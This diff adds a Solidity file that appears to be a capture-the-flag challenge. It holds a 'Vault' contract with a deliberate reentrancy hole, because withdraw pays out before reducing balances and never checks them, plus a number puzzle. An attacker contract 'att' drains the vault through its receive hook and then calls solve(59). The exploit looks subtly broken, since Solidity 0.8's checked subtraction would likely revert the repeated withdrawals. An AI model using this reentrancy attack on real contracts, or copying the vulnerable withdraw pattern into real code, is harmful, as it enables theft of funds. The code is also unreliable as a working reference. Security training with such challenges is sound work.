@@ -1,0 +1,81 @@
+pragma solidity 0.8.0;
+
+contract Vault {
+    mapping(address => uint256) public balances;
+    bool public flag = false;
+
+    constructor() payable{
+        require(msg.value == 100);
+    }
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw(uint256 _amount) external payable {
+        (bool success, ) = payable (msg.sender).call{value: _amount}("");
+        require(success, "[OK]");
+
+        balances[msg.sender] -= _amount;
+    }
+
+    function solve(uint256 _number) public {
+        require(address(this).balance == 0, "address(this) balance not 0");
+        require(_number % 3 == 2, "stage01");
+        require(_number % 5 == 4, "stage02");
+        require(_number % 7 == 3, "stage03");
+        flag = true;
+    }
+
+    function balanceOf(address _addr) external view returns(uint256) {
+        return balances[_addr];
+    }
+
+    function canWithdraw(address _user, uint256 _amount) external view returns(bool) {
+        return balances[_user] >= _amount;
+    }
+
+    function isSolved() public view returns(bool) {
+        return flag == true;
+    }
+}
+contract att
+{
+    Vault public  v;
+    constructor(address payable  add) public payable 
+    {
+            v=Vault(add);
+    }
+    function a() public  view returns(uint) 
+    {
+        uint _number=0;
+        while(true)
+        {
+            if(_number % 3 == 2&&_number % 5 == 4&&_number % 7 == 3)
+            {
+                return _number;
+            }
+            _number+=1;
+        }
+    }
+    function d() public payable 
+    {
+        v.deposit{value : 100 wei}();
+        
+    }
+    function w() public payable 
+    {
+        v.withdraw(100);
+    }
+    receive () external payable { 
+        if(address(v).balance>=100)
+        {
+            v.withdraw(100);
+        }
+        else if(address(v).balance<100)//在取完钱后攻击
+        {
+            v.solve(59);
+            v.deposit{value :address(this).balance}();
+        }
+    }
+}
